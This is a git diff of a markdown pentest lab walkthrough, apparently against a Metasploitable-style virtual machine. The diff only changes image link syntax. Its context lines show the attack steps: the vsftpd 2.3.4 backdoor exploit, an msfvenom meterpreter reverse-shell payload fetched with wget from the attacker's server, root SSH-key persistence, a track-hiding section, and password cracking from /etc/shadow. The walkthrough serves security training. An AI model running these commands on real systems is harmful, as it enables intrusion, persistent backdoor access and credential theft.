@@ -6,7 +6,7 @@ Scan with Nmap from Kali to know the target IP on the network:
 nmap -sn 192.168.56.0/24
 ```
 
-![[Pasted image 20250211190103.png]]
+![Alt text](Pasted%20image%2020250211190103.png)
 
 Identify the ports opened and the services used by our target `192.168.56.107`. By default, nmap uses a `SYN scan`, which might be blocked by a firewall. Instead, try a `TCP Connect` scan:
 
@@ -14,14 +14,14 @@ Identify the ports opened and the services used by our target `192.168.56.107`. 
 nmap -sT 192.168.56.107
 ```
 
-![[Pasted image 20250211190940.png]]
+![Alt text](Pasted%20image%2020250211190940.png)
 
 We will explore the service version of the protocol `ftp` in the port 21:
 ```
 nmap -sV -p 21 192.168.56.107
 ```
 
-![[Pasted image 20250211191406.png]]
+![Alt text](Pasted%20image%2020250211191406.png)
 
 vsftpd is prone to a backdoor vulnerability because the `vsftpd-2.3.4.tar.gz` source package file contains a backdoor (CVE-2011-2523). An attacker can cause the application to open a backdoor on port 6200 by logging to the FTP server with the username ':)'. We will try to find a vulnerability related to that service version in Metasploit. 
 
@@ -34,7 +34,7 @@ msfconsole
 search vsftpd
 ```
 
-![[Pasted image 20250211191707.png]]
+![Alt text](Pasted%20image%2020250211191707.png)
 
 We know that there is an exploit for that protocol version. Let's exploit it!
 
@@ -49,7 +49,7 @@ set RHOSTS 192.168.56.101
 options
 ```
 
-![[Pasted image 20250209200128.png]]
+![Alt text](Pasted%20image%2020250209200128.png)
 
 Exploit:
 ```
@@ -73,7 +73,7 @@ pwd 123456789
 
 Now you could read files from the attacker `Kali linux`:
 
-![[Pasted image 20250209200514.png]]
+![Alt text](Pasted%20image%2020250209200514.png)
 
 ---
 ## 2.3. Post-exploitation: SSH key persistence
@@ -106,10 +106,10 @@ Generation of payload `reverse_tcp` with `msfvenon`:
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<AttackerIp> LPORT=<PortSelected> -f elf -o hola
 ```
 
-![[Pasted image 20250215104019.png]]
+![Alt text](Pasted%20image%2020250215104019.png)
 
 `hola` will be generated with the payload `linux/x86/meterpreter/reverse_tcp`, and the configuration of the ip and port to send the reverse shell. The file is created in the current directory. 
-![[Pasted image 20250215104057.png]]
+![Alt text](Pasted%20image%2020250215104057.png)
 
 We need now a way to send the file to the target machine.
 
@@ -119,14 +119,14 @@ Create a server in the attackers machine so that the target machine can download
 python -m http.server 80
 ```
 
-![[Pasted image 20250214215337.png]]
+![Alt text](Pasted%20image%2020250214215337.png)
 
 Download the file in the target machine from the attacker to the target machine using the vsftpd exploit:
 ```
 wget http://<AttackerIp>/hola
 ```
 
-![[Pasted image 20250215104137.png]]
+![Alt text](Pasted%20image%2020250215104137.png)
 
 In the target machine run the payload:
 ```
@@ -147,7 +147,7 @@ run
 
 In the attacker machine you will see the meterpreter session open with the reverse shell:
 
-![[Pasted image 20250215104444.png]]
+![Alt text](Pasted%20image%2020250215104444.png)
 
 ### 2.3.3. Generate the SSH Key
 In the attacker machine, we generate a SSH Key:
@@ -157,12 +157,12 @@ mkdir ssh
 ssh-keygen -t rsa -b 4096 -f ~/.ssh/persist_key
 ```
 
-![[Pasted image 20250215111433.png]]
+![Alt text](Pasted%20image%2020250215111433.png)
 This creates:
 - Private Key: ~/.ssh/persist_key (Keep this safe! It's the attacker backdoor.)
 - Public Key: ~/.ssh/persist_key.pub (To inject into the target.)
 
-![[Pasted image 20250215111502.png]]
+![Alt text](Pasted%20image%2020250215111502.png)
 
 ### 2.3.4. Upload the public SSH Key to the target machine
 
@@ -172,7 +172,7 @@ Transfer the public key to the target (placed in root to maintain root access):
 upload persist_key.pub /root/.ssh/authorized_keys
 ```
 
-![[Pasted image 20250215111820.png]]
+![Alt text](Pasted%20image%2020250215111820.png)
 
 ### 2.3.5. SSH checks in the target machine
 
@@ -186,10 +186,10 @@ Restart SSH in the target machine:
 sudo /etc/init.d/ssh restart
 ```
 
-![[Pasted image 20250215113357.png]]
+![Alt text](Pasted%20image%2020250215113357.png)
 
 Check the state of the SSH port (22) from the attacker machine:
-![[Pasted image 20250215115813.png]]
+![Alt text](Pasted%20image%2020250215115813.png)
 
 In this case, the port is not open. Enable it from the target machine:
 ```
@@ -197,14 +197,14 @@ sudo ufw allow 22
 ```
 
 Verify that it is open:
-![[Pasted image 20250215121301.png]]
+![Alt text](Pasted%20image%2020250215121301.png)
 ### 2.3.6. SSH Connection
 
 ```
 ssh -v -i ~/.ssh/persist_key -oHostKeyAlgorithms=ssh-rsa -oPubKeyAcceptedKeyTypes=ssh-rsa root@target_ip
 ```
 
-![[Pasted image 20250215133514.png]]
+![Alt text](Pasted%20image%2020250215133514.png)
 
 ### 2.3.6.1. Troubleshooting
 
@@ -214,13 +214,13 @@ Host key algorithm AND pub key type has to be defined in the SSH command. Exampl
 ssh -i ~/.ssh/persist_key root@target_ip
 ```
 
-![[Pasted image 20250215133245.png]]
+![Alt text](Pasted%20image%2020250215133245.png)
 
 ```
 ssh -v -i ~/.ssh/persist_key -oHostKeyAlgorithms=ssh-rsa root@target_ip
 ```
 
-![[Pasted image 20250215133412.png]]
+![Alt text](Pasted%20image%2020250215133412.png)
 I do not know the user password!
 
 ### 2.3.7. Hide Your Tracks (Stealth)
@@ -256,7 +256,7 @@ We will use **John the Ripper (JtR)**, which attempts to crack the hashed passwo
 unshadow passwd shadow > hashes.txt
 ```
 
-![[Pasted image 20250215164528.png]]
+![Alt text](Pasted%20image%2020250215164528.png)
 
 Use John the Ripper:
 
@@ -264,7 +264,7 @@ Use John the Ripper:
 john hashes.txt
 ```
 
-![[Pasted image 20250215164847.png]]
+![Alt text](Pasted%20image%2020250215164847.png)
 
 Now we have the root password: `msfadmin`.
 
